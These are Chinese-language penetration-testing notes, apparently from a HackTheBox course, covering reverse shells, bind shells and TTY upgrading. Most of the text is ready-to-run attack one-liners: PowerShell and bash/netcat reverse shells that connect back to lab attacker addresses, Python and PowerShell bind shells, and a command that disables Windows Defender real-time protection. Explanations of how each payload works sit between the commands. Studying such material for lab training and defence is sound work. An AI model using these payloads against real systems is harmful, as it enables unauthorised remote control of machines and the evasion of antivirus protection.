ReverseShell

需要在攻击机开启nc监听，然后再从目标机器运行revshell命令，对攻击机反向连接。

很多命令可以在[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md)和Reverse Shell Generator中找到。

Windows

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.123',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# powershell -nop -c 启动一个no profile 的pwsh，执行""中的命令
# $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) 实例化一个TCPClient对象，连接到括号中的地址
# [byte[]]$bytes = 0..65535|%{0}这实际上是一个空字节流，将定向到等待连接的攻击框上的 TCP 侦听器。

在开启了Windows Defender antivirus的情况下，这个命令可能会被阻止，这样需要使用管理员关闭掉它（真实场景下如何实现？）

PS C:\\Users\\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true

Linux

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

# mkfifo --make a named pipe file at /tmp/f
# 第一个 | 将 /bin/bash 的标准输入和cat的标准输出连接，2>&1将标准错误和标准输出重定向到下一个pipe
# 使用nc连接目标地址，监听端口，输出会重定向到/tmp/f

BindShell

在目标机上开启对0.0.0.0的监听，这样就能接收到来自各方的连接，然后再从攻击机上使用nc连接

Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# client端连接
Ak4izZ@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

upgrading TTY

通常连接shell之后，为了得到完整交互的shell，还需要升级tty。参考Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog

常用的办法就是先在连接上的shell上

Ak4izZ@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'

然后ctrl+z

Ak4izZ@htb[/htb]$ stty raw -echo
Ak4izZ@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$

最后可以统一一下尺寸和大小

先查询一下本机shell的

Ak4izZ@htb[/htb]$ echo $TERM

xterm-256color

Ak4izZ@htb[/htb]$ stty size

67 318

然后将目标的shell也设为同样的

www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318

PowerShell one-liner

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

首先新建一个TCPClient对象，地址为 10.10.14.15:443，接着用GetStream()方法获取用于读取和写入数据的NetworkStream对象。接下来，创建一个65535字节的字节数组，并初始化每个元素为0。然后使用一个while循环等待从服务器读取数据，并将其存储在字节数组中。当读取操作返回零时（-ne –> 不等于0），表示服务器已关闭连接，此时脚本将关闭 TCPClient 对象并退出。在读取到服务器发送的数据后，使用 New-Object 命令将字节数组转换为 ASCII 编码字符串。然后，使用 iex 命令执行字符串作为 PowerShell 代码，并使用 Out-String 命令将输出转换为字符串并将其存储在变量 $sendback 中。接下来，将 $sendback 和当前目录路径拼接为一个字符串并将其存储在变量 $sendback2 中。最后，使用 [text.encoding]::ASCII 类的 GetBytes() 方法将 $sendback2 转换为一个字节数组，并使用 NetworkStream 对象的 Write() 方法将其发送回服务器。
